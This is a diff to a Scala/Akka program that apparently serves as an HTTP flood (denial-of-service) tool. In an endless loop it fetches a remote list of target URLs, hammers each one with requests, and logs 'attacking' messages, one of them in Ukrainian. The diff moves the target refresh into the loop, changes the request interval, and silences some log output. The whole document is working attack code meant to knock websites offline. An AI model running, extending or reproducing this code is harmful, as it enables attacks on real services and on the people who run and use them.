@@ -66,17 +66,18 @@ object Test {
     implicit val system: ActorSystem = ActorSystem()
     implicit val executionContext: ExecutionContextExecutor = system.dispatcher
 
-    if (System.currentTimeMillis() - lastUpdate > REFRESH_TIME) {
-      file = fetchTargets
-      println(s"list updated. size=${file.size}")
-    }
-
     while (true) {
+      println(s"Атакую групу ${file.mkString("[", ", ", "]")}")
+      if (System.currentTimeMillis() - lastUpdate > REFRESH_TIME) {
+        file = fetchTargets
+        println(s"list updated. size=${file.size}")
+      }
+
       file.foreach {
         url =>
           innerRequest(url, false)
       }
-      Thread.sleep(500)
+      Thread.sleep(1000)
     }
   }
 
@@ -86,9 +87,9 @@ object Test {
     Http().singleRequest(HttpRequest(uri = str)).flatMap {
       case HttpResponse(StatusCodes.OK, _, _, _) =>
         if (!recursion) {
-          println(s"attack $str")
+          //println(s"attack $str")
         } else {
-          println(s"attack after redirect $str")
+          //println(s"attack after redirect $str")
         }
 
         Future.successful()
